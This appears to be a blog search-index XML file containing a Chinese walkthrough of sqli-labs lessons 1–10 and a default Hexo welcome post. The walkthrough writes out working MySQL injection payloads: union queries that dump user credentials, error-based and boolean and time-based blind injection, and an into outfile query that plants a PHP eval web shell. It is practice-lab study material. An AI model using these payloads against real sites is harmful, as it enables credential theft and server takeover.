<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sqli-labs解题思路]]></title>
    <url>%2F2018%2F07%2F06%2Fsql-labs%2F</url>
    <content type="text"><![CDATA[1-10/解题思路Less-1 GET-Error based-Single quotes-String首先是正常的查询界面 输入单引号可以看到报错信息，根据报错信息可以知道输入的id被单引号包裹，接下来猜字段。 order by后的数字大于3的时候页面会返回报错信息，也就是表里有3个字段。 这里的 %23 是 # 的url编码，用于注释。 接下来构造联合查询语句，这里页面没有变化的原因是后台只显示返回的查询结果的第一条记录。 可以让联合查询的左边查询结果为空，那么就会显示右边的查询结果 接下来就可以利用各种数据库函数查看数据库信息。 接下来爆表名，构造下面的语句,这里后台会限制查询结果的显示个数，所以利用了 group_concat() 函数 ?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23 接下来就继续爆列名，这里以 users 表为例，构造下列语句。 ?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; %23 然后构造下面的语句可以查询到所有用户的信息 ?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users %23 Less-2 GET-Error based-Intiger based输入单引号可以看到报错信息，可以判断为数字型注入 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-3 GET-Error based-Single with twist-String 添加单引号页面返回报错信息，可以知道 id 被 (&apos;&apos;) 包裹 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-4 GET-Error based-Double quotes-String 添加双引号页面返回报错信息，id 被 (&quot;&quot;) 包裹 判断字段数为3 联合查询 爆表名 爆列名 爆出所有用户信息 Less-5 GET-Double injection-Single quotes-String道题我的思路是盲注，之后参考了一下别人的writeup知道是双查询注入，题目也是提示，然后了解了一下双查询注入是有固定的语句： ?id=1&apos; union select count(*),2,concat((select database()),floor(rand()*2))a from information_schema.tables group by a %23 database()可以替换成需要查询的数据 标题有提示是单引号，然后判断字段数为3 然后使用双查询注入，这里报错显示的security0去掉后面的0就是当前使用的数据库名 接着爆表名，这里直接查询表名会出现以下报错信息，需要用limit限定范围 接着爆列名，同上。 爆数据 Less-6 GET-Double injection-Double quotes-String和上一题的步骤一样，但是要把单引号替换为双引号。 Less-7 GET-Dump into outfile-String这题看了一下源码和别人的思路。 先在之前的关卡获取到数据库的路径：@@basedir获取mysql的安装路径，@@datadir获取mysql的数据路径 网站的根目录就是 &apos;C:/phpStudy/PHPTutorial/WWW/&apos; 这里执行后会发现文件并没有写入目录，查了一下资料是因为缺少权限： mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本都默认为空，之后都为null，null为禁用数据的导入导出，空为变量无效。 查看secure_file_priv全局系统变量 为了测试把修改本地的my.ini文件并重启服务 构造如下语句： ?id=1&apos;)) union select 1,database(),user() into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test.txt&apos; %23 执行后页面会如图显示 但是查看www目录，可以看到生成了test.txt文件 构造下面的语句导出users表数据 ?id=1&apos;)) union select 1,group_concat(username),group_concat(password) from users into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/test2.txt&apos; %23 然后可以写入一句话木马 ?id=1&apos;)) union select 1,2,&apos;&lt;?php eval($_GET[&quot;shell&quot;]);?&gt;&apos; into outfile &apos;C:/phpStudy/PHPTutorial/WWW/sqli-labs/shell.php&apos; %23 Less-8 GET-Blind-Boolian based-Single quotes这题是布尔盲注，查询为空时页面会不同 猜测字段为3 用二分法爆表名 1234567891011121314151617?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 %23 返回正常页面?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 %23 返回异常页面，第一张表名的长度为6?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23 返回正常页面?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101 %23 返回异常页面，第一位是 e?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 返回正常页面?id=1' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 返回异常页面，第二位是 m剩余4位同上。 爆users表字段 123456789101112?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))&gt;7 %23 返回正常页面?id=1' and length((select column_name from information_schema.columns where table_name='users' limit 1,1))&gt;8 %23 返回异常页面，users表第二个字段名长度为8?id=1' and ascii(mid((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))&gt;116 %23 返回正常页面?id=1' and ascii(mid((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))&gt;117 %23 返回异常页面，第一位是 u剩余位数同上。之后就可以爆数据了。原理同上。 Less-9 GET-Blind-Time based-Single quotes这题是时间盲注，无论输入什么参数页面都不会变化。 1234567891011121314爆第一张表?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6,1,sleep(4)) %23页面延迟较长时间返回?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5,1,sleep(4)) %23页面在正常时间内返回，判断表名长度为6?id=1' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101,1,sleep(4)) %23页面延迟返回?id=1' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,1,sleep(4)) %23页面正常返回，第一位的ascii码为101，也就是 e剩余位数同上。 Less-10 GET-Blind-Time based-Double quotes和上一题的步骤一样，但是要把单引号替换为双引号。]]></content>
      <categories>
        <category>Web-Security</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F03%2F15%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
